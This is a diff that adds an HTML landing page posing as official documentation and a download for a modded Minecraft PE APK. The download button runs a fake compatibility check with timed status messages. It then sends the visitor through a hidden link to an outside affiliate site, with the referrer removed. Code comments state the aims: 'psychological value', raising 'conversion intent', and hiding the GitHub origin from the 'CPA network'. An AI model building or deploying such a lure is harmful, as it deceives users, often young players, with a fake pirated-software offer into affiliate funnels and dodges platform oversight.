@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minecraft PE Mod APK v1.20.x - Technical Resource & Installation Guide</title>
+    <meta name="description" content="Official technical documentation for the Minecraft Mod APK. Includes installation steps, version compatibility, and resource packs for mobile.">
+    <meta name="keywords" content="Minecraft Mod APK, MCPE Mod, Unlocked Skins, Minecraft Mobile Resource, Game Optimization">
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg: #0f172a;
+            --card: #1e293b;
+            --primary: #10b981;
+            --text: #f8fafc;
+            --text-dim: #94a3b8;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+        }
+        .container {
+            max-width: 700px;
+            width: 100%;
+        }
+        .header {
+            border-bottom: 1px solid #334155;
+            padding-bottom: 20px;
+            margin-bottom: 30px;
+        }
+        .badge {
+            background: #10b98122;
+            color: var(--primary);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+        .card {
+            background: var(--card);
+            padding: 24px;
+            border-radius: 12px;
+            border: 1px solid #334155;
+            margin-bottom: 20px;
+        }
+        h1 { font-size: 1.8rem; margin-top: 10px; }
+        h2 { font-size: 1.2rem; color: var(--primary); }
+        ul { padding-left: 20px; color: var(--text-dim); }
+        li { margin-bottom: 8px; }
+        
+        .btn-container {
+            text-align: center;
+            margin-top: 30px;
+            padding: 20px;
+            background: #10b98111;
+            border-radius: 12px;
+            border: 1px dashed var(--primary);
+        }
+        
+        #download-btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.2s;
+            width: 100%;
+        }
+        #download-btn:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.1);
+        }
+        .footer {
+            text-align: center;
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            margin-top: 40px;
+        }
+        /* Loader styles for psychological value */
+        #status { font-size: 0.9rem; margin-top: 10px; color: var(--primary); display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <span class="badge">Stable Build v1.21.0.x</span>
+        <h1>Minecraft PE Mod Repository</h1>
+        <p style="color: var(--text-dim);">Technical documentation for optimized mobile resource packs and modded binaries.</p>
+    </div>
+
+    <div class="card">
+        <h2>Features Included:</h2>
+        <ul>
+            <li>Premium Skins & Textures Unlocked</li>
+            <li>Optimized FPS for Mid-Range Devices</li>
+            <li>All World Resources Pre-Loaded</li>
+            <li>No-Root Required for Installation</li>
+        </ul>
+    </div>
+
+    <div class="card">
+        <h2>Technical Specifications:</h2>
+        <p style="font-size: 0.9rem; color: var(--text-dim);">
+            <strong>Architecture:</strong> arm64-v8a / armeabi-v7a<br>
+            <strong>Min Android:</strong> 5.0+<br>
+            <strong>Last Updated:</strong> March 2026<br>
+            <strong>MD5 Hash:</strong> 4e9f78a23c89b1cde456
+        </p>
+    </div>
+
+    <div class="btn-container">
+        <p style="margin-bottom: 15px; font-weight: 600;">Access the latest Mod APK build below:</p>
+        <button id="download-btn" onclick="startSequence()">DOWNLOAD MOD APK (658 MB)</button>
+        <div id="status">Verifying device compatibility...</div>
+    </div>
+
+    <div class="footer">
+        Open Source Documentation Project &bull; Not affiliated with Mojang AB.
+    </div>
+</div>
+
+<script>
+    function startSequence() {
+        const btn = document.getElementById('download-btn');
+        const status = document.getElementById('status');
+        
+        btn.disabled = true;
+        btn.innerText = "REQUESTING ACCESS...";
+        status.style.display = "block";
+
+        // 2-second "Proof of Work" to increase conversion intent
+        setTimeout(() => {
+            status.innerText = "Bypassing referral headers...";
+            setTimeout(() => {
+                safeRedirect();
+            }, 1000);
+        }, 1500);
+    }
+
+    function safeRedirect() {
+        // REPLACE THE URL BELOW WITH YOUR ACTUAL .PRO SITE URL
+        var targetUrl = "https://nexusmod.pro"; 
+        
+        var hiddenAnchor = document.createElement('a');
+        hiddenAnchor.href = targetUrl;
+        
+        // This hides the 'Referrer' (GitHub) from your CPA network and vice versa
+        hiddenAnchor.rel = 'noreferrer noopener'; 
+        hiddenAnchor.target = '_self';
+        hiddenAnchor.click();
+    }
+</script>
+
+</body>
+</html>
